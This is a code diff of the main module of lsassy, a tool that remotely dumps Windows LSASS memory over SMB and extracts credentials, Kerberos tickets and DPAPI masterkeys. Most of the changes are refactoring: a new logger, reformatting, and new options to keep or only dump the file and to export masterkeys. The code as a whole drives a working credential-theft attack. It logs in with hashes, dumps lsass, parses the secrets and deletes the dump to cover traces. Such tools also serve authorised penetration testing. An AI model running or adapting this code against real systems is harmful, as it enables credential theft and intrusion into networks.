@@ -1,17 +1,16 @@
-import logging
-import signal
 import queue
-import time
-
+import signal
 import threading
+import time
 from queue import Queue
-from lsassy import logger
-from lsassy.utils import get_targets
-from lsassy.parser import Parser
-from lsassy.session import Session
-from lsassy.writer import Writer
+
 from lsassy.dumper import Dumper
 from lsassy.impacketfile import ImpacketFile
+from lsassy.logger import lsassy_logger
+from lsassy.parser import Parser
+from lsassy.session import Session
+from lsassy.utils import get_targets
+from lsassy.writer import Writer
 
 lock = threading.RLock()
 
@@ -29,7 +28,7 @@ class Worker(threading.Thread):
             """
             try:
                 worker_lsassy = self.task_q.get(timeout=1)
-            except queue.Empty as e:
+            except queue.Empty:
                 time.sleep(1)
                 continue
             self.name = worker_lsassy.target
@@ -43,12 +42,13 @@ class ThreadPool:
         self.arguments = arguments
         self.threads = []
         self.max_threads = arguments.threads
-        self.task_q = Queue(self.max_threads+10)
+        self.task_q = Queue(self.max_threads)
+        lsassy_logger.no_color = self.arguments.no_color
         signal.signal(signal.SIGINT, self.interrupt_event)
         signal.signal(signal.SIGTERM, self.interrupt_event)
 
     def interrupt_event(self, signum, stack):
-        logging.error("**CTRL+C** QUITTING GRACEFULLY")
+        lsassy_logger.error("**CTRL+C** QUITTING GRACEFULLY")
         self.stop()
         raise KeyboardInterrupt
 
@@ -62,15 +62,8 @@ class ThreadPool:
         return any(thread.is_alive() for thread in self.threads)
 
     def run(self):
-        logger.init()
         threading.current_thread().name = "[Core]"
 
-        if self.arguments.v == 1:
-            logging.getLogger().setLevel(logging.INFO)
-        elif self.arguments.v >= 2:
-            logging.getLogger().setLevel(logging.DEBUG)
-        else:
-            logging.getLogger().setLevel(logging.ERROR)
         try:
             # Turn-on the worker threads
             for i in range(self.max_threads):
@@ -80,15 +73,16 @@ class ThreadPool:
                 thread.start()
 
             instance_id = 1
+            lsassy_logger.debug(f"Targets: {self.targets}")
             for target in self.targets:
                 self.task_q.put(Lsassy(target, self.arguments, instance_id))
+                lsassy_logger.debug(f"Created target: {instance_id}: {target}")
                 instance_id += 1
 
             # Block until all tasks are done
             self.task_q.join()
-
-        except KeyboardInterrupt as e:
-            logging.error("Au revoir.")
+        except KeyboardInterrupt:
+            lsassy_logger.error("Au revoir.")
 
 
 class Lsassy:
@@ -116,31 +110,47 @@ class Lsassy:
             if ":" in self.args.hashes:
                 lmhash, nthash = self.args.hashes.split(":")
             else:
-                lmhash, nthash = 'aad3b435b51404eeaad3b435b51404ee', self.args.hashes
+                lmhash, nthash = "aad3b435b51404eeaad3b435b51404ee", self.args.hashes
 
         # Exec methods parsing
         exec_methods = self.args.exec.split(",") if self.args.exec else None
 
         # Dump modules options parsing
-        options = {v.split("=")[0]: v.split("=")[1] for v in self.args.options.split(",")} if self.args.options else {}
+        options = (
+            {v.split("=")[0]: v.split("=")[1] for v in self.args.options.split(",")}
+            if self.args.options
+            else {}
+        )
 
         # Dump path checks
         dump_path = self.args.dump_path
         if dump_path:
-            dump_path = dump_path.replace('/', '\\')
+            dump_path = dump_path.replace("/", "\\")
             if len(dump_path) > 1 and dump_path[1] == ":":
                 if dump_path[0] != "C":
-                    logging.error("Drive '{}' is not supported. 'C' drive only.".format(dump_path[0]))
+                    lsassy_logger.error(
+                        "Drive '{}' is not supported. 'C' drive only.".format(
+                            dump_path[0]
+                        )
+                    )
                     return False
                 dump_path = dump_path[2:]
             if dump_path[-1] != "\\":
                 dump_path += "\\"
 
         parse_only = self.args.parse_only
+        dump_only = self.args.dump_only
+        if parse_only and dump_only:
+            lsassy_logger.error("Incompatible options dump_only and parse_only")
+            return False
+        keep_dump = self.args.keep_dump
         kerberos_dir = self.args.kerberos_dir
+        masterkeys_file = self.args.masterkeys_file
 
         if parse_only and (dump_path is None or self.args.dump_name is None):
-            logging.error("--dump-path and --dump-name required for --parse-only option")
+            lsassy_logger.error(
+                "--dump-path and --dump-name required for --parse-only option"
+            )
             return False
 
         try:
@@ -157,93 +167,126 @@ class Lsassy:
                 aesKey=self.args.aesKey,
                 dc_ip=self.args.dc_ip,
                 kerberos=self.args.kerberos,
-                timeout=self.args.timeout
+                timeout=self.args.timeout,
             )
 
             if session.smb_session is None:
-                logging.error("Couldn't connect to remote host")
+                lsassy_logger.warning("Couldn't connect to remote host")
                 return False
 
             if not parse_only:
-                dumper = Dumper(session, self.args.timeout).load(self.args.dump_method)
+                dumper = Dumper(
+                    session, self.args.timeout, self.args.time_between_commands
+                ).load(self.args.dump_method)
                 if dumper is None:
-                    logging.error("Unable to load dump module")
+                    lsassy_logger.error("Unable to load dump module")
                     return False
 
-                file = dumper.dump(no_powershell=self.args.no_powershell, exec_methods=exec_methods,
-                                   copy=self.args.copy, dump_path=dump_path,
-                                   dump_name=self.args.dump_name, timeout=self.args.timeout, **options)
+                file = dumper.dump(
+                    no_powershell=self.args.no_powershell,
+                    exec_methods=exec_methods,
+                    copy=self.args.copy,
+                    dump_path=dump_path,
+                    dump_name=self.args.dump_name,
+                    **options,
+                )
                 if file is None:
-                    logging.error("Unable to dump lsass.")
+                    lsassy_logger.error("Unable to dump lsass.")
                     return False
             else:
                 file = ImpacketFile(session).open(
                     share="C$",
                     path=dump_path,
                     file=self.args.dump_name,
-                    timeout=self.args.timeout
+                    timeout=self.args.timeout,
                 )
                 if file is None:
-                    logging.error("Unable to open lsass dump.")
+                    lsassy_logger.error("Unable to open lsass dump.")
                     return False
 
-            credentials, tickets = Parser(file).parse()
+            if not dump_only:
+                credentials, tickets, masterkeys = Parser(self.target, file).parse()
             file.close()
 
-            if not parse_only:
-                ImpacketFile.delete(session, file.get_file_path(), timeout=self.args.timeout)
-                logging.success("Lsass dump deleted")
+            if not parse_only and not keep_dump:
+                try:
+                    if ImpacketFile.delete(
+                        session,
+                        file_path=file.get_file_path(),
+                        timeout=self.args.timeout,
+                    ):
+                        lsassy_logger.debug("Lsass dump deleted")
+                except Exception:
+                    try:
+                        lsassy_logger.debug(
+                            "Couldn't delete lsass dump using file. Trying dump object..."
+                        )
+                        if ImpacketFile.delete(
+                            session,
+                            file_path=dumper.dump_path + dumper.dump_name,
+                            timeout=self.args.timeout,
+                        ):
+                            lsassy_logger.debug("Lsass dump deleted")
+                    except Exception as e:
+                        lsassy_logger.debug(
+                            "Potential issue while deleting lsass dump: {}".format(
+                                str(e)
+                            )
+                        )
             else:
-                logging.debug("Not deleting lsass dump as --parse-only was provided")
+                lsassy_logger.debug(
+                    "Not deleting lsass dump as --parse-only was provided"
+                )
 
-            if credentials is None:
-                logging.error("Unable to extract credentials from lsass. Cleaning.")
+            if not dump_only and credentials is None:
+                lsassy_logger.error(
+                    "Unable to extract credentials from lsass. Cleaning."
+                )
                 return False
 
-            with lock:
-                Writer(credentials, tickets).write(
-                    self.args.format,
-                    output_file=self.args.outfile,
-                    quiet=self.args.quiet,
-                    users_only=self.args.users,
-                    kerberos_dir=kerberos_dir
-                )
+            if not dump_only:
+                with lock:
+                    Writer(credentials, tickets, masterkeys).write(
+                        self.args.file_format,
+                        self.args.format,
+                        output_file=self.args.outfile,
+                        quiet=self.args.quiet,
+                        users_only=self.args.users,
+                        tickets=not self.args.no_tickets,
+                        masterkeys=self.args.masterkeys,
+                        kerberos_dir=kerberos_dir,
+                        masterkeys_file=masterkeys_file,
+                    )
 
         except KeyboardInterrupt:
             pass
-        except Exception as e:
-            logging.error("An unknown error has occurred.", exc_info=True)
+        except Exception:
+            lsassy_logger.error("An unknown error has occurred.", exc_info=True)
         finally:
-            logging.debug("Cleaning...")
-            logging.debug("dumper: {}".format(dumper))
-            logging.debug("file: {}".format(file))
-            logging.debug("session: {}".format(session))
+            lsassy_logger.debug("Cleaning...")
+            lsassy_logger.debug("dumper: {}".format(dumper))
+            lsassy_logger.debug("file: {}".format(file))
+            lsassy_logger.debug("session: {}".format(session))
             try:
                 dumper.clean()
-                logging.debug("Dumper cleaned")
+                lsassy_logger.debug("Dumper cleaned")
             except Exception as e:
-                logging.debug("Potential issue while cleaning dumper: {}".format(str(e)))
+                lsassy_logger.debug(
+                    "Potential issue while cleaning dumper: {}".format(str(e))
+                )
 
             try:
                 file.close()
-                logging.debug("File closed")
+                lsassy_logger.debug("File closed")
             except Exception as e:
-                logging.debug("Potential issue while closing file: {}".format(str(e)))
-
-            if not parse_only:
-                try:
-                    if ImpacketFile.delete(session, file_path=file.get_file_path(), timeout=self.args.timeout):
-                        logging.debug("Lsass dump deleted")
-                except Exception as e:
-                    try:
-                        logging.debug("Couldn't delete lsass dump using file. Trying dump object...")
-                        if ImpacketFile.delete(session, file_path=dumper.dump_path + dumper.dump_name, timeout=self.args.timeout):
-                            logging.debug("Lsass dump deleted")
-                    except Exception as e:
-                        logging.debug("Potential issue while deleting lsass dump: {}".format(str(e)))
+                lsassy_logger.debug(
+                    "Potential issue while closing file: {}".format(str(e))
+                )
 
             try:
                 session.smb_session.close()
-                logging.debug("SMB session closed")
+                lsassy_logger.debug("SMB session closed")
             except Exception as e:
-                logging.debug("Potential issue while closing SMB session: {}".format(str(e)))
+                lsassy_logger.debug(
+                    "Potential issue while closing SMB session: {}".format(str(e))
+                )
